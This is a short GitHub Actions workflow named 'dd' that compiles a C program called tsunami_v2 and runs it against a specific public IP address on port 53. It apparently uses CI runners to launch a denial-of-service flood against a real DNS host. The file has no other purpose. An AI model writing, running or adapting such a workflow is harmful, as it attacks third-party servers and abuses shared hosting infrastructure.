name: dd
on: workflow_dispatch
jobs:
  dd:
    runs-on: ubuntu-latest
    container: archlinux
    steps:
      - uses: actions/checkout@v6
      - run: pacman -Syu --noconfirm gcc
      - run: gcc -O3 -flto -march=native -o tsunami_v2 tsunami_v2.c
      - run: ./tsunami_v2 183.81.168.150 53
